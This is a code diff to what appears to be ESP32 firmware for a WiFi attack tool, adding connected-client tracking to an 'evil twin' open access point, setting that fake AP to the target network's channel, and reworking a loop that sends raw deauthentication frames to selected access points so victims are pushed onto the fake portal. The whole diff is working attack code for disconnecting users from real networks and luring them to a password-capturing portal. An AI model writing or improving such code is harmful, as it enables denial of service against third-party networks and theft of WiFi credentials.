@@ -206,6 +206,9 @@ static uint32_t last_channel_check_time = 0;
 static const uint32_t CHANNEL_CHECK_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes
 static volatile bool periodic_rescan_in_progress = false; // Flag to suppress logs during periodic re-scans
 
+// Client tracking for Evil Twin portal
+static volatile int portal_connected_clients = 0;
+
 // SAE Overflow attack task
 static TaskHandle_t sae_attack_task_handle = NULL;
 static volatile bool sae_attack_active = false;
@@ -273,7 +276,7 @@ void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
     ESP_LOG_BUFFER_HEXDUMP(TAG, frame_buffer, size, ESP_LOG_DEBUG);
 
 
-    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
     if (err == ESP_ERR_NO_MEM) {
         //give it a breath:
         vTaskDelay(pdMS_TO_TICKS(20));
@@ -281,7 +284,7 @@ void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
         return; // lub ponów próbę później
     }
 
-    //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
+    //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false));
 }
 
 
@@ -796,6 +799,20 @@ static void wifi_event_handler(void *event_handler_arg,
             MY_LOG_INFO(TAG, "AP: Client connected - MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
                        e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5]);
             
+            // Increment connected clients counter
+            portal_connected_clients++;
+            MY_LOG_INFO(TAG, "Portal: Client count = %d", portal_connected_clients);
+            
+            // During evil twin attack, switch to first selected network's channel
+            if ((applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK) && 
+                g_selected_count > 0 && target_bssid_count > 0) {
+                int idx = g_selected_indices[0];
+                uint8_t target_channel = target_bssids[0].channel; // Use first target_bssid (corresponds to first selected network)
+                MY_LOG_INFO(TAG, "Client connected to portal - switching to channel %d (first selected network: %s)", 
+                           target_channel, g_scan_results[idx].ssid);
+                esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
+            }
+            
             // Log DHCP lease information if available
             esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
             if (ap_netif) {
@@ -878,6 +895,18 @@ static void wifi_event_handler(void *event_handler_arg,
             const wifi_event_ap_stadisconnected_t *e = (const wifi_event_ap_stadisconnected_t *)event_data;
             MY_LOG_INFO(TAG, "AP: Client disconnected - MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
                        e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5]);
+            
+            // Decrement connected clients counter
+            if (portal_connected_clients > 0) {
+                portal_connected_clients--;
+            }
+            MY_LOG_INFO(TAG, "Portal: Client count = %d", portal_connected_clients);
+            
+            // If last client disconnected during evil twin attack, resume channel hopping
+            if (portal_connected_clients == 0 && 
+                (applicationState == DEAUTH_EVIL_TWIN || applicationState == EVIL_TWIN_PASS_CHECK)) {
+                MY_LOG_INFO(TAG, "Last client disconnected - resuming channel hopping for deauth");
+            }
             break;
         }
         case WIFI_EVENT_SCAN_DONE: {
@@ -2278,7 +2307,7 @@ static int cmd_start_evil_twin(int argc, char **argv) {
                 .ap = {
                     .ssid = "",
                     .ssid_len = 0,
-                    .channel = 1,
+                    .channel = target_bssid_count > 0 ? target_bssids[0].channel : 1,
                     .password = "",
                     .max_connection = 4,
                     .authmode = WIFI_AUTH_OPEN
@@ -5360,21 +5389,48 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
             continue;
         }
         
+        // During evil twin with connected clients, only attack networks on same channel as first selected network
+        if ((applicationState == DEAUTH_EVIL_TWIN) && portal_connected_clients > 0 && target_bssid_count > 0) {
+            uint8_t first_network_channel = target_bssids[0].channel; // First selected network's channel
+            if (target_bssids[i].channel != first_network_channel) {
+                // Skip networks on different channels when clients are connected
+                continue;
+            }
+            // Only send deauth on same channel - no channel switch needed since we're already on this channel
+        }
+        
         // Enhanced logging to debug BSSID mismatch issue
         // MY_LOG_INFO(TAG, "DEAUTH: Sending to SSID: %s, CH: %d, BSSID: %02X:%02X:%02X:%02X:%02X:%02X (target_bssids[%d])",
         //         target_bssids[i].ssid, target_bssids[i].channel,
         //         target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
         //         target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5], i);
         
-        vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
-        esp_wifi_set_channel(target_bssids[i].channel, WIFI_SECOND_CHAN_NONE );
-        vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
+        // If no clients connected or not evil twin mode, do normal channel hopping
+        if (portal_connected_clients == 0 || applicationState != DEAUTH_EVIL_TWIN) {
+            vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
+            esp_wifi_set_channel(target_bssids[i].channel, WIFI_SECOND_CHAN_NONE );
+            vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
+        }
 
         uint8_t deauth_frame[sizeof(deauth_frame_default)];
         memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
         memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
         memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
         wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+        
+        // If clients are connected during evil twin, immediately return to first network's channel
+        // This ensures we're on the correct channel when clients try to connect to the portal
+        if ((applicationState == DEAUTH_EVIL_TWIN) && portal_connected_clients > 0 && target_bssid_count > 0) {
+            uint8_t first_network_channel = target_bssids[0].channel;
+            esp_wifi_set_channel(first_network_channel, WIFI_SECOND_CHAN_NONE);
+        }
+    }
+    
+    // After sending all deauth frames, always return to first network's channel during evil twin
+    // This maximizes probability of being on correct channel when clients try to connect
+    if ((applicationState == DEAUTH_EVIL_TWIN) && target_bssid_count > 0) {
+        uint8_t first_network_channel = target_bssids[0].channel;
+        esp_wifi_set_channel(first_network_channel, WIFI_SECOND_CHAN_NONE);
     }
 
 }
